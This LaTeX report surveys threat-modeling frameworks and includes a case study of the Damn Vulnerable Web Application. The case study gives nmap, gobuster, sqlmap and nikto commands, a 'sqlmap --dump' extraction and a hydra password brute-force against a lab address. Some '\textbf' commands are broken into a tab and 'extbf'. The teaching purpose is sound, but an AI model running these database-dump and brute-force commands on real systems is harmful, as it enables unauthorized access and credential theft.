\documentclass{article}

% Language setting
\usepackage[english]{babel}

% Set page size and margins
\usepackage[letterpaper,top=2cm,bottom=2cm,left=3cm,right=3cm,marginparwidth=1.75cm]{geometry}

% Useful packages
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage[colorlinks=true, allcolors=blue]{hyperref}
\usepackage{enumitem}
\usepackage{float}

\title{Web Application Threat Model}
\author{Aditya Pangavhane}

\begin{document}
\maketitle

\begin{abstract}
In cybersecurity, finding vulnerabilities is not just about scanning or exploiting; it begins with structured steps that build awareness of the target system. After planning the approach and gathering information about the application, the next step is threat modeling. At this stage we shift perspective from attacker to protector: instead of asking "how can we break the system," we ask "where could the system break, and how can we defend it."

Threat modeling works like mapping the weak points of a house before a storm. We examine how attackers might attempt entry, what they could achieve, and the possible business impact if they succeed. This report studies established methodologies such as STRIDE, PASTA, OWASP threat categories, and NIST risk guidance. Each framework provides a structured way to recognize potential weaknesses in a web application before attackers exploit them.

We describe threats in everyday terms—such as using stolen credentials to impersonate a user or injecting malicious input to expose private data—and connect them directly to business risks like loss of user trust, downtime, or regulatory penalties. For each identified threat, we highlight realistic security controls including stronger authentication, data validation, encryption, and active monitoring. The purpose of this report is not only technical defense but also to provide non-technical stakeholders with clarity on why these risks matter.
\end{abstract}


% =====================
% Expanded Chapter Structure
% =====================

\section{Introduction}

% Introduction Chapter: Expanded and Enhanced
\subsection*{1. The Imperative for Threat Modeling}
In the digital age, organizations face an unprecedented array of cyber threats, ranging from opportunistic malware to sophisticated nation-state attacks. The complexity of modern IT environments—cloud computing, IoT, mobile, and legacy systems—creates countless opportunities for adversaries to exploit vulnerabilities. As Bruce Schneier notes in "Secrets and Lies"\cite{schneier1999}, security is not a product but a process, and proactive risk management is essential. Threat modeling has emerged as a cornerstone of this process, enabling defenders to anticipate, prioritize, and mitigate risks before they materialize.

\subsection*{2. Defining Threat Modeling}
Threat modeling is a structured methodology for identifying, evaluating, and addressing security threats throughout the lifecycle of a system or application. Adam Shostack, in "Threat Modeling: Designing for Security"\cite{shostack2014}, emphasizes the importance of "thinking like an attacker"—mapping assets, entry points, trust boundaries, and potential vulnerabilities. This approach shifts security left, embedding risk analysis into design and development rather than relying on reactive measures post-deployment.

\subsection*{3. Historical Context and Evolution}
The origins of threat modeling can be traced to the late 1990s, when Microsoft introduced the STRIDE framework\cite{shostack2014}. Early security practices focused on perimeter defenses, but the rise of application-level attacks and insider threats demanded a more nuanced approach. Over time, frameworks such as OCTAVE\cite{nist800154}, PASTA\cite{uceda2015}, and community-driven resources like OWASP\cite{owasp} expanded the discipline, integrating business context, regulatory requirements, and attacker simulation. Today, threat modeling is recognized as a best practice by standards bodies (NIST, ISO), regulators (GDPR, HIPAA), and industry leaders.

\subsection*{4. Benefits and Business Value}
Threat modeling delivers value far beyond technical risk reduction. By identifying vulnerabilities early, organizations can achieve significant cost savings—remediation during design is exponentially cheaper than post-breach recovery. The process supports regulatory compliance, with frameworks such as PCI DSS and GDPR mandating formal risk assessments. It also fosters collaboration among developers, architects, and business stakeholders, creating a shared language for discussing risk. As UcedaVélez and Morana argue in "Risk Centric Threat Modeling"\cite{uceda2015}, aligning security with business objectives is critical for effective risk management.

\subsection*{5. Threat Modeling in the Secure Development Lifecycle}
Integrating threat modeling into the Secure Development Lifecycle (SDL) is essential for building resilient systems. Microsoft’s SDL and Google’s security engineering practices demonstrate the value of embedding risk analysis into every phase—from requirements gathering to deployment and maintenance. Continuous threat modeling enables organizations to adapt to evolving threats, incorporate new technologies securely, and maintain compliance with industry standards.

\subsection*{6. Stakeholder Involvement and Collaboration}
Effective threat modeling requires input from a diverse group of stakeholders: developers, architects, product managers, business analysts, and security experts. Cross-functional collaboration ensures that all aspects of the system are considered, from technical vulnerabilities to business logic flaws and user experience concerns. This holistic approach leads to more comprehensive and realistic threat models, stronger security outcomes, and greater organizational buy-in.

\subsection*{7. Structure of This Document}
This book provides a comprehensive, reference-driven guide to threat modeling. Each chapter explores a major framework (STRIDE, PASTA, Trike, VAST, OCTAVE, OWASP), presents technical definitions, practical methodologies, and real-world case studies. The lab chapter offers hands-on exercises using Linux security tools, while the references chapter consolidates authoritative sources. Whether you are a newcomer or a seasoned practitioner, this document delivers actionable insight, academic rigor, and practical wisdom for building robust, proactive defenses.

\subsection*{8. Further Reading}
For those seeking deeper knowledge, the following books are highly recommended:
\begin{itemize}
	\item Adam Shostack, "Threat Modeling: Designing for Security" (Wiley, 2014)
	\item Tony UcedaVélez and Marco M. Morana, "Risk Centric Threat Modeling" (Wiley, 2015)
	\item Bruce Schneier, "Secrets and Lies: Digital Security in a Networked World" (Wiley, 1999)
	\item NIST SP 800-154: Guide to Data-Centric System Threat Modeling
	\item OWASP Threat Modeling Cheat Sheet
\end{itemize}


\section{Background and Evolution of Threat Modeling}

% Background Chapter: Expanded and Enhanced
\subsection*{1. Origins of Threat Modeling}
Threat modeling has evolved from a niche security practice to a central pillar of modern cybersecurity strategy. In the earliest days of computing, security focused on defending the network perimeter—firewalls, access controls, and antivirus software were the primary tools. As Bruce Schneier observed\cite{schneier1999}, this reactive approach left many systems exposed to sophisticated attacks exploiting design, implementation, and business logic flaws. The rise of the internet and interconnected systems in the 1980s and 1990s fundamentally changed the threat landscape, making perimeter defenses alone insufficient.

\subsection*{2. Early Security Practices and Limitations}
During the 1980s and 1990s, organizations began to recognize the limitations of traditional security models. Attackers found new ways to bypass controls, and insider threats became more prominent. The need for a proactive, systematic approach to risk management led to the development of structured threat modeling methodologies. Security professionals started to look beyond technology, considering organizational context, regulatory requirements, and adversary tactics.

\subsection*{3. The Emergence of Structured Frameworks}
The late 1990s marked a turning point with the introduction of the STRIDE framework by Microsoft\cite{shostack2014}. STRIDE provided a repeatable process for identifying and categorizing threats during the software design phase, enabling teams to address security concerns before deployment. Around the same time, Carnegie Mellon University developed OCTAVE\cite{nist800154}, focusing on organizational risk and asset-based analysis. The PASTA methodology\cite{uceda2015} emphasized attacker simulation and business impact, while community-driven resources like OWASP\cite{owasp} promoted practical, actionable guidance for developers and security teams.

\subsection*{4. Key Milestones in Threat Modeling}
The evolution of threat modeling is marked by several key milestones:
\begin{itemize}
	\item \textbf{1999: STRIDE} — Microsoft introduces STRIDE, integrating threat modeling into the Secure Development Lifecycle (SDL) and establishing a foundation for modern security engineering\cite{shostack2014}.
	\item \textbf{2001: OCTAVE} — Carnegie Mellon University develops OCTAVE, focusing on organizational risk and asset-based analysis, and promoting a holistic view of security\cite{nist800154}.
	\item \textbf{2012: PASTA} — The Process for Attack Simulation and Threat Analysis (PASTA) is published, emphasizing attacker perspective, business impact, and the integration of technical and business analysis\cite{uceda2015}.
	\item \textbf{2010s: VAST, Trike, and OWASP} — New frameworks emerge to address scalability, risk quantification, agile development, and community-driven best practices\cite{owasp}.
\end{itemize}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.8\textwidth]{images/stride-analysis}
	\caption{Timeline of Major Threat Modeling Frameworks}
\end{figure}

\subsection*{5. Modern Threat Modeling: Tools, Standards, and Practice}
Today, threat modeling is a mature discipline supported by a wide range of tools, methodologies, and community resources. It is recognized as a best practice by standards bodies (NIST SP 800-154\cite{nist800154}, ISO 27001), regulatory frameworks (GDPR, HIPAA), and industry groups (OWASP\cite{owasp}). Modern threat modeling addresses not only technical vulnerabilities but also business logic, supply chain risks, and emerging technologies such as cloud, IoT, and artificial intelligence. The field continues to evolve, with new approaches and tools emerging to meet the challenges of increasingly complex and interconnected systems.

\subsection*{6. Academic and Industry Collaboration}
The history of threat modeling reflects decades of research, real-world experience, and collaboration between industry, academia, and the security community. Leading books such as Shostack’s "Threat Modeling"\cite{shostack2014}, UcedaVélez and Morana’s "Risk Centric Threat Modeling"\cite{uceda2015}, and Schneier’s "Secrets and Lies"\cite{schneier1999} provide foundational knowledge. Standards like NIST SP 800-154\cite{nist800154} and resources from OWASP\cite{owasp} ensure that best practices are accessible and actionable for organizations of all sizes.

\subsection*{7. Summary and Looking Forward}
Understanding the evolution of threat modeling helps organizations appreciate its value and apply its principles to build more secure and resilient systems. As threats continue to evolve, so too must the methodologies and tools used to defend against them. The next chapters will explore the technical definitions, frameworks, and practical applications that underpin modern threat modeling.


\section{STRIDE: Microsoft’s Threat Modeling Framework}

\section*{STRIDE: Microsoft’s Threat Modeling Framework}
STRIDE is a mnemonic framework developed by Microsoft to systematically identify and categorize security threats in software systems\cite{shostack2014}. Each letter represents a distinct threat category:
\begin{itemize}
	\item \textbf{S}poofing identity: Illegitimate access by pretending to be another user or system.
	\item \textbf{T}ampering with data: Unauthorized modification of data or code.
	\item \textbf{R}epudiation: Denial of actions or transactions by users, often due to lack of proper logging.
	\item \textbf{I}nformation disclosure: Unauthorized exposure of sensitive information.
	\item \textbf{D}enial of service: Disruption of service availability to legitimate users.
	\item \textbf{E}levation of privilege: Gaining higher access rights than intended.
\end{itemize}

\subsection*{Technical Definitions and Application}
	extbf{Spoofing:} The act of pretending to be someone or something else to gain unauthorized access. Example: Using stolen credentials to log in as another user.\cite{shostack2014}

	extbf{Tampering:} Unauthorized alteration of data or code, such as modifying a database record via SQL injection.\cite{owasp}

	extbf{Repudiation:} The ability of users to deny their actions, often due to insufficient logging or lack of digital signatures.\cite{nist800154}

	extbf{Information Disclosure:} Accidental or malicious exposure of confidential data, such as leaking PII through misconfigured APIs.\cite{uceda2015}

	extbf{Denial of Service:} Attacks that disrupt the availability of a service, e.g., DDoS attacks on login endpoints.\cite{owasp}

	extbf{Elevation of Privilege:} Exploiting vulnerabilities to gain higher access, such as exploiting a vulnerable admin panel.\cite{shostack2014}

\subsection*{STRIDE Threat Categories Table}
\begin{table}[H]
\centering
\begin{tabular}{|l|l|l|l|}
\hline
	extbf{Category} & \textbf{Description} & \textbf{Example} & \textbf{Control} \\
\hline
Spoofing & Impersonating users or systems & Stolen credentials & MFA, strong auth \\
Tampering & Modifying data or code & SQL injection & Input validation, hashing \\
Repudiation & Denying actions & Log deletion & Audit logs, digital signatures \\
Information Disclosure & Leaking sensitive data & Data breach & Encryption, access control \\
Denial of Service & Disrupting service & DDoS attack & Rate limiting, WAF \\
Elevation of Privilege & Gaining unauthorized access & Privilege escalation & RBAC, least privilege \\
\hline
\end{tabular}
\caption{STRIDE Threat Categories, Examples, and Controls\cite{shostack2014,owasp}}
\end{table}

\subsection*{STRIDE and Data Flow Diagrams (DFDs)}
STRIDE is most effective when applied to Data Flow Diagrams (DFDs), which visually represent system components, data stores, and trust boundaries. Each element is analyzed for threats in all STRIDE categories.\cite{shostack2014}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\textwidth]{images/stride-analysis}
	\caption{Example STRIDE Analysis on a Data Flow Diagram}
\end{figure}

\subsection*{Practical Example}
Consider a web application with user authentication, a database, and an admin panel. Applying STRIDE:
\begin{itemize}
	\item \textbf{Spoofing:} Attackers use phishing or credential stuffing to impersonate users.
	\item \textbf{Tampering:} SQL injection to alter database records.
	\item \textbf{Repudiation:} Users delete logs to hide malicious actions.
	\item \textbf{Information Disclosure:} Sensitive data exposed via misconfigured APIs.
	\item \textbf{Denial of Service:} Attackers flood the login endpoint.
	\item \textbf{Elevation of Privilege:} Exploiting a vulnerable admin panel to gain root access.
\end{itemize}

\subsection*{STRIDE in Secure Development}
Microsoft recommends integrating STRIDE into the Secure Development Lifecycle (SDL), using it to drive security requirements, code reviews, and testing. Modern tools, such as the Microsoft Threat Modeling Tool, automate parts of the STRIDE process and help teams visualize threats and mitigations\cite{shostack2014,owasp}.


\section{PASTA: Process for Attack Simulation and Threat Analysis}


% PASTA Chapter: Expanded and Enhanced
\subsection*{1. Introduction to PASTA}
The PASTA methodology (Process for Attack Simulation and Threat Analysis) represents a significant advancement in risk-centric threat modeling. Developed by Tony UcedaVélez and Marco M. Morana\cite{uceda2015}, PASTA integrates business objectives with technical analysis, enabling organizations to simulate real-world attacks and prioritize mitigations based on actual risk. Unlike traditional frameworks that focus solely on technical vulnerabilities, PASTA emphasizes the alignment of security strategies with organizational goals, regulatory requirements, and the evolving threat landscape.

\subsection*{2. Technical Definitions and Seven Stages}
PASTA is structured into seven distinct stages, each designed to provide a comprehensive view of the system and its risks:
\begin{enumerate}
	\item \textbf{Business Impact Analysis:} Identify critical assets, business goals, and compliance requirements. This ensures risk management efforts are aligned with the organization’s risk appetite and strategic objectives.
	\item \textbf{Technical Scope Definition:} Map system architecture, technologies, and interfaces. Document trust boundaries and data flows to visualize how information moves and where vulnerabilities may exist.
	\item \textbf{Application Decomposition:} Break down the application into components, subsystems, and data flows. Use Data Flow Diagrams (DFDs) and architecture diagrams to identify areas for further analysis.
	\item \textbf{Threat Analysis:} Identify potential threats using frameworks such as STRIDE, attack trees, and adversary profiles\cite{shostack2014}. Focus on how attackers might target the system and what tactics they might employ.
	\item \textbf{Vulnerability Analysis:} Assess for known and potential vulnerabilities using CVE databases, automated scanners, and code reviews\cite{owasp}. Prioritize which weaknesses need to be addressed first.
	\item \textbf{Attack Modeling:} Simulate real-world attack scenarios, leveraging penetration testing tools and adversary tactics\cite{nist800154}. Gain practical insights into how threats could materialize and their potential impact.
	\item \textbf{Risk and Impact Analysis:} Prioritize risks and develop mitigation strategies, balancing security needs with business requirements and cost considerations\cite{uceda2015}. Ensure resources are allocated effectively and significant risks are addressed.
\end{enumerate}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.8\textwidth]{images/system-context}
	\caption{PASTA Process Overview: From Business Impact to Risk Mitigation}
\end{figure}

\subsection*{3. Advantages and Practical Application}
PASTA offers several advantages over traditional threat modeling frameworks:
\begin{itemize}
	\item \textbf{Holistic Risk Management:} Integrates business and technical perspectives for a comprehensive approach.
	\item \textbf{Attacker Simulation:} Simulates realistic threats and attack paths that might otherwise be overlooked.
	\item \textbf{Risk-Based Decision Making:} Enables organizations to prioritize controls based on actual risk rather than theoretical concerns.
	\item \textbf{Scalability:} Suitable for complex, enterprise systems and environments subject to stringent regulatory requirements\cite{uceda2015}.
\end{itemize}

\subsection*{4. Implementing PASTA in the Real World}
PASTA is particularly well-suited for organizations with high-value assets, regulatory obligations, or complex threat environments. Successful implementation requires cross-functional collaboration between business, security, and technical teams. Many organizations use PASTA in conjunction with automated tools for attack simulation and vulnerability scanning, ensuring that both strategic and operational risks are addressed\cite{uceda2015,owasp}. By adopting PASTA, organizations can move beyond checkbox compliance and build security programs that are truly aligned with their business objectives.

\subsection*{5. Academic Perspective and Further Reading}
PASTA’s methodology is documented in leading books and standards. For deeper understanding, refer to:
\begin{itemize}
	\item Tony UcedaVélez and Marco M. Morana, "Risk Centric Threat Modeling" (Wiley, 2015)
	\item Adam Shostack, "Threat Modeling: Designing for Security" (Wiley, 2014)
	\item NIST SP 800-154: Guide to Data-Centric System Threat Modeling
	\item OWASP Threat Modeling Cheat Sheet
\end{itemize}


\section{Other Frameworks: Trike, VAST, OCTAVE, and OWASP}

\section*{Other Frameworks: Trike, VAST, OCTAVE, and OWASP}
Threat modeling is a diverse and evolving discipline, with several frameworks developed to address different organizational, technical, and regulatory needs. This chapter explores four important alternatives to STRIDE and PASTA, providing technical definitions, strengths, limitations, and practical application guidance\cite{owasp,nist800154}.

\subsection*{Trike}
Trike is a risk management and threat modeling framework that focuses on defining acceptable risk and generating threat models based on system requirements. It uses three core models:\cite{uceda2015}
\begin{itemize}
	\item \textbf{Requirement Model:} Defines what is allowed and expected in the system.
	\item \textbf{Attack Model:} Identifies what can go wrong, mapping attacker actions to system components.
	\item \textbf{Risk Model:} Quantifies the impact and likelihood of threats, supporting risk-based decision making.
\end{itemize}
	extbf{Strengths:} Quantitative risk analysis, strong requirements focus.\\
	extbf{Limitations:} Less intuitive for developers, limited tool support.

\subsection*{VAST (Visual, Agile, and Simple Threat)}
VAST is designed for scalability and integration with agile/DevOps workflows. It uses visual diagrams to model both application and operational threats, making it suitable for large organizations with complex systems. VAST emphasizes automation and continuous threat modeling.\cite{owasp}
	extbf{Strengths:} Scalable, visual, integrates with CI/CD.\\
	extbf{Limitations:} Less detailed adversary simulation than PASTA.

\subsection*{OCTAVE (Operationally Critical Threat, Asset, and Vulnerability Evaluation)}
OCTAVE, developed by Carnegie Mellon, focuses on organizational risk and asset-based analysis. It aligns security with business objectives and is often applied at the enterprise level.\cite{nist800154}
	extbf{Strengths:} Business alignment, asset focus, strategic.\\
	extbf{Limitations:} Less technical detail, not ideal for application-level threats.

\subsection*{OWASP Threat Modeling}
OWASP provides a wealth of resources, including the Threat Modeling Cheat Sheet, which offers practical guidance, checklists, and templates. OWASP’s approach is community-driven and emphasizes actionable steps for developers and security teams.\cite{owasp}
	extbf{Strengths:} Practical, widely adopted, open-source resources.\\
	extbf{Limitations:} Not a formal framework, but a collection of best practices.

\subsection*{Framework Comparison Table}
\begin{table}[H]
\centering
\begin{tabular}{|l|l|l|l|}
\hline
	extbf{Framework} & \textbf{Focus} & \textbf{Best For} & \textbf{Limitation} \\
\hline
STRIDE & App threats & Dev/design teams & Less business focus \\
PASTA & Risk/attacker & Regulated, high-value & Resource intensive \\
Trike & Risk quantification & Auditors, risk managers & Steep learning curve \\
VAST & Scalability & Large, agile orgs & Less adversary detail \\
OCTAVE & Org risk & Enterprise, strategy & Not app-level \\
OWASP & Practical steps & Devs, SMEs & Not a full framework \\
\hline
\end{tabular}
\caption{Comparison of Threat Modeling Frameworks\cite{owasp,uceda2015,nist800154}}
\end{table}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.8\textwidth]{images/stride-analysis}
	\caption{Visual Comparison of Threat Modeling Frameworks}
\end{figure}


\section{Threat Modeling Methodology: Step-by-Step}


% Methodology Chapter: Expanded and Enhanced
\subsection*{1. Introduction to Threat Modeling Methodology}
Threat modeling is most effective when approached as a systematic, repeatable process that integrates technical rigor with business context\cite{shostack2014,uceda2015,owasp}. This chapter provides a detailed methodology, technical definitions, and practical tools for organizations seeking to build resilient systems and manage risk proactively.

\subsection*{2. Step-by-Step Threat Modeling Process}
	extbf{Step 1: Identify Assets}
The first step in threat modeling is to identify all assets that require protection. Assets include data, systems, credentials, intellectual property, and any other resources of value to the organization\cite{nist800154}. A comprehensive asset inventory is created using interviews, documentation reviews, and architecture diagrams. This inventory forms the foundation for subsequent analysis, ensuring that all critical resources are considered in the threat model.

	extbf{Step 2: System Decomposition}
System decomposition involves breaking down the application into its constituent components, data flows, and trust boundaries\cite{shostack2014}. Data Flow Diagrams (DFDs) are used to visualize how information moves within the system and where controls are applied. This step helps teams understand the architecture, identify potential entry points for attackers, and pinpoint areas that require additional scrutiny.

	extbf{Step 3: Identify Threats}
Threats are potential events or actions that could cause harm to assets\cite{owasp}. Security teams apply frameworks such as STRIDE or PASTA to each component and data flow, using checklists and attack trees to ensure comprehensive coverage. This analysis enables organizations to anticipate how adversaries might target the system and what tactics they might employ.

	extbf{Step 4: Identify Vulnerabilities}
Vulnerabilities are weaknesses that can be exploited by threats\cite{nist800154}. Teams use vulnerability databases (e.g., CVE, NVD), automated scanners, and code reviews to identify and document vulnerabilities. This step is critical for prioritizing remediation efforts and ensuring that the most significant risks are addressed first.

	extbf{Step 5: Assess Risks}
Risk assessment combines the likelihood and impact of a threat exploiting a vulnerability\cite{uceda2015}. Organizations use risk matrices and scoring systems (such as DREAD and CVSS) to evaluate and prioritize risks. This structured approach supports informed decision-making and resource allocation.

	extbf{Step 6: Define and Prioritize Mitigations}
Mitigations are security controls designed to reduce risk\cite{owasp}. Teams develop and prioritize controls based on business impact, cost, and feasibility. This step ensures that security investments are aligned with organizational goals and that resources are used effectively.

	extbf{Step 7: Document and Communicate}
Documentation is essential for making the threat model accessible, actionable, and up-to-date\cite{shostack2014}. Teams create detailed reports with diagrams, tables, and recommendations, sharing them with stakeholders and updating them as the system evolves. Effective communication ensures that everyone understands the risks and the steps being taken to mitigate them.

\subsection*{3. Templates, Tools, and Best Practices}
To support the threat modeling process, organizations use a variety of templates and tools, including asset inventory templates, DFD and architecture diagram examples, threat checklists (such as STRIDE and OWASP Top 10), risk matrix templates, and mitigation tracking spreadsheets. These resources help standardize the process and ensure consistency across projects. Modern tools such as the Microsoft Threat Modeling Tool, OWASP Threat Dragon, and custom spreadsheets are widely used in industry.

\subsection*{4. Workflow Diagram}
The following diagram illustrates the threat modeling workflow, from asset identification to mitigation:
\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\textwidth]{images/system-context}
	\caption{Threat Modeling Workflow: From Asset Identification to Mitigation\cite{shostack2014}}
\end{figure}

\subsection*{5. Academic Perspective and Further Reading}
For deeper understanding, refer to:
\begin{itemize}
	\item Adam Shostack, "Threat Modeling: Designing for Security" (Wiley, 2014)
	\item Tony UcedaVélez and Marco M. Morana, "Risk Centric Threat Modeling" (Wiley, 2015)
	\item NIST SP 800-154: Guide to Data-Centric System Threat Modeling
	\item OWASP Threat Modeling Cheat Sheet
\end{itemize}


\section{Case Study: Threat Model of a Vulnerable Web Application}


% Case Study Chapter: Expanded and Enhanced
\subsection*{1. Introduction: Humanizing Threat Modeling}
This chapter brings threat modeling to life through a detailed, humanized case study of the Damn Vulnerable Web Application (DVWA)\cite{owasp}. Rather than simply listing steps, it immerses the reader in the mindset of both attacker and defender, showing how real-world knowledge, technical skill, and strategic thinking converge to protect digital assets. The narrative is designed to deliver deep insight, practical wisdom, and a book-like experience that goes beyond checklists to reveal the true art and science of cybersecurity.

\subsection*{2. Asset Identification and Business Impact}
Every effective security strategy begins with understanding what is at stake. In our case study, the security team starts by cataloging all assets that require protection. These include user credentials (usernames and passwords), session tokens, user data (notes, files, and personal information), the application’s source code, and the backend database\cite{nist800154}. Each asset is evaluated not just for its technical value, but for its business impact—what would happen if it were compromised? This holistic approach ensures that the threat model is grounded in real organizational priorities, not just technical details.

\subsection*{3. Attack Surface Mapping and System Context}
With assets identified, the next step is to map the attack surface—the sum of all points where an attacker can interact with the system\cite{owasp}. The team visualizes the web login form, REST API endpoints, database connections, and the admin panel, considering how each could be targeted. This process is not just technical; it requires creative thinking and empathy for the adversary’s perspective. By walking through the system as an attacker would, defenders uncover hidden risks and design more effective controls. The attack surface map becomes a living document, updated as the system evolves and new threats emerge.
\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\textwidth]{images/system-context}
	\caption{System Context Diagram for Case Study}
\end{figure}

\subsection*{4. Reconnaissance and Scanning: Attacker’s Perspective}
Reconnaissance is the art of gathering intelligence. The team uses Linux tools to probe the system, uncovering open ports, running services, and technologies in use\cite{shostack2014}. Commands like `nmap` reveal the network’s structure, while `gobuster` and `whatweb` expose hidden directories and software versions. This phase is both technical and psychological: defenders must anticipate the attacker’s curiosity, persistence, and ingenuity. The insights gained here inform every subsequent step, shaping the threat model and guiding defensive strategy.
\begin{verbatim}
# Discover open ports
nmap -sV -T4 -p- 10.0.0.5

# Enumerate web directories
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt

# Identify technologies
whatweb http://10.0.0.5
\end{verbatim}

\subsection*{5. Vulnerability Scanning and Analysis}
Armed with reconnaissance data, the team turns to vulnerability scanning. Tools like `sqlmap` and `nikto` automate the search for weaknesses, probing for SQL injection, cross-site scripting (XSS), and other common flaws\cite{owasp}. This process is rigorous and methodical, but also creative—defenders must think beyond the obvious, considering how attackers might chain vulnerabilities or exploit subtle misconfigurations. The results are documented, prioritized, and mapped to business risks, ensuring that remediation efforts are both effective and efficient.
\begin{verbatim}
# Scan for SQL injection
sqlmap -u "http://10.0.0.5/login.php" --forms --batch

# Check for XSS
nikto -h http://10.0.0.5
\end{verbatim}

\subsection*{6. Exploitation: Turning Theory into Reality}
The final phase is exploitation—the moment when theory meets reality. Here, the team demonstrates how attackers might leverage identified vulnerabilities to gain unauthorized access or extract sensitive data\cite{uceda2015}. Commands like `sqlmap --dump` show how a simple flaw can lead to catastrophic data loss, while brute-force attacks on weak admin passwords highlight the importance of strong authentication. This section is not just a technical walkthrough; it is a call to action, reminding readers that every vulnerability is a story waiting to be told—and prevented.
\begin{verbatim}
# Exploit SQL injection to dump users
sqlmap -u "http://10.0.0.5/login.php" --dump

# Exploit weak admin password
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.5 http-post-form \
"/admin/login.php:username=^USER^&password=^PASS^:F=incorrect"
\end{verbatim}

\subsection*{7. Threat Enumeration (STRIDE/PASTA)}
	extbf{Definition:} Threat enumeration maps discovered vulnerabilities to threat categories\cite{shostack2014,uceda2015}.
\begin{itemize}
	\item Spoofing: Brute-force login, session fixation
	\item Tampering: SQL injection, file upload
	\item Repudiation: Lack of logging
	\item Information Disclosure: Sensitive data in responses
	\item Denial of Service: Flooding login endpoint
	\item Elevation of Privilege: Exploiting admin panel
\end{itemize}

\subsection*{8. Mitigation Strategies and Defensive Wisdom}
	extbf{Definition:} Mitigations are controls that reduce the likelihood or impact of threats\cite{owasp}.
\begin{itemize}
	\item Enforce strong authentication (MFA, password policy)
	\item Use parameterized queries and ORM
	\item Implement audit logging
	\item Encrypt sensitive data in transit and at rest
	\item Rate limit login attempts
	\item Restrict admin panel access
\end{itemize}

\subsection*{9. Academic Perspective and Further Reading}
For deeper understanding, refer to:
\begin{itemize}
	\item Tony UcedaVélez and Marco M. Morana, "Risk Centric Threat Modeling" (Wiley, 2015)
	\item Adam Shostack, "Threat Modeling: Designing for Security" (Wiley, 2014)
	\item NIST SP 800-154: Guide to Data-Centric System Threat Modeling
	\item OWASP Threat Modeling Cheat Sheet
\end{itemize}


\section{Security Controls, Mitigations, and Best Practices}

\section*{Security Controls, Mitigations, and Best Practices}
Effective threat modeling leads to actionable security controls. Security controls are technical, administrative, or physical safeguards designed to reduce risk by preventing, detecting, or responding to threats\cite{owasp,shostack2014}.

\subsection*{Authentication and Authorization}
	extbf{Definition:} Authentication verifies user identity; authorization determines access rights.\cite{owasp}
\begin{itemize}
	\item Multi-factor authentication (MFA)
	\item Strong password policies and storage (bcrypt, Argon2)
	\item Role-based access control (RBAC)
	\item Principle of least privilege
\end{itemize}

\subsection*{Input Validation and Output Encoding}
	extbf{Definition:} Input validation ensures only properly formed data enters the system; output encoding prevents injection attacks.\cite{owasp}
\begin{itemize}
	\item Validate all user input (whitelisting preferred)
	\item Use output encoding to prevent XSS
	\item Employ parameterized queries to prevent SQL injection
\end{itemize}

\subsection*{Data Protection}
	extbf{Definition:} Data protection involves safeguarding sensitive data at rest and in transit.\cite{nist800154}
\begin{itemize}
	\item Encrypt sensitive data in transit (TLS 1.3) and at rest (AES-256)
	\item Use secure cookies (HTTPOnly, Secure, SameSite)
	\item Mask sensitive data in logs
\end{itemize}

\subsection*{Monitoring and Incident Response}
	extbf{Definition:} Monitoring detects suspicious activity; incident response is the process of managing and mitigating security incidents.\cite{uceda2015}
\begin{itemize}
	\item Implement centralized logging and monitoring
	\item Set up alerting for suspicious activity
	\item Develop and test an incident response plan
\end{itemize}

\subsection*{Security Control Mapping Table}
\begin{table}[H]
\centering
\begin{tabular}{|l|l|l|}
\hline
	extbf{Threat} & \textbf{Control} & \textbf{Tool/Technique} \\
\hline
Spoofing & MFA, strong auth & Google Auth, Authy \\
Tampering & Input validation & OWASP ESAPI, ORM \\
Repudiation & Audit logs & ELK, Splunk \\
Info Disclosure & Encryption, access control & OpenSSL, GPG \\
DoS & Rate limiting, WAF & ModSecurity, Cloudflare \\
Privilege Escalation & RBAC, least privilege & IAM, sudoers \\
\hline
\end{tabular}
\caption{Mapping Security Controls to Threats\cite{owasp,shostack2014}}
\end{table}

\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\textwidth]{images/stride-analysis}
	\caption{Security Controls Mapped to Threat Categories}
\end{figure}


\section{Risk Assessment, Reporting, and Continuous Improvement}


% Risk Reporting Chapter: Expanded and Enhanced
\subsection*{1. Introduction to Risk Assessment and Reporting}
Risk assessment is a critical component of the threat modeling process, enabling organizations to evaluate the likelihood and impact of threats exploiting vulnerabilities\cite{uceda2015,nist800154}. By systematically assessing risk, organizations can prioritize mitigations, allocate resources effectively, and ensure that security efforts are focused on the most significant threats. Effective reporting and continuous improvement are essential for maintaining an actionable and adaptive risk management program.

\subsection*{2. Risk Matrix and Quantitative Analysis}
A risk matrix is a tool used to visualize and prioritize risks based on their likelihood and impact\cite{nist800154}. The following table provides an example of how common threats are assessed:
\begin{table}[H]
\centering
\begin{tabular}{|l|l|l|l|}
\hline
		extbf{Threat} & \textbf{Likelihood} & \textbf{Impact} & \textbf{Risk Level} \\
\hline
SQL Injection & High & Critical & High \\
Session Hijacking & Medium & High & High \\
DDoS Attack & High & Medium & Medium \\
Data Breach & Medium & Critical & High \\
\hline
\end{tabular}
\caption{Risk Assessment Matrix\cite{uceda2015,nist800154}}
\end{table}

\subsection*{3. Visualizing Risk and Prioritization}
Visual tools such as risk matrices, heat maps, and scoring systems (DREAD, CVSS) help organizations communicate risk to stakeholders and prioritize remediation efforts. The following diagram illustrates how risk assessment and prioritization can be visualized:
\begin{figure}[H]
	\centering
	\includegraphics[width=0.7\textwidth]{images/stride-analysis}
	\caption{Visualizing Risk Assessment and Prioritization}
\end{figure}

\subsection*{4. Reporting Templates and Communication}
Standardized reporting templates are used to communicate risk findings and recommendations to stakeholders\cite{shostack2014}. These templates typically include:
\begin{itemize}
	\item Executive summary
	\item System overview and diagrams
	\item Threat and risk analysis tables
	\item Security control recommendations
	\item Action plan and timeline
\end{itemize}
Clear and consistent reporting ensures that decision-makers understand the risks and the steps being taken to mitigate them. Reports should be tailored to the audience, whether technical teams, business leaders, or regulators.

\subsection*{5. Continuous Improvement and Metrics}
Continuous improvement is the ongoing process of refining security practices based on lessons learned and evolving threats\cite{owasp}. Organizations integrate threat modeling into DevSecOps pipelines, schedule regular reviews and updates, track key metrics (such as the number of threats mitigated and time to remediation), and foster a security-aware culture through training and awareness. This adaptive approach ensures that risk management remains effective in the face of changing technologies and adversary tactics.
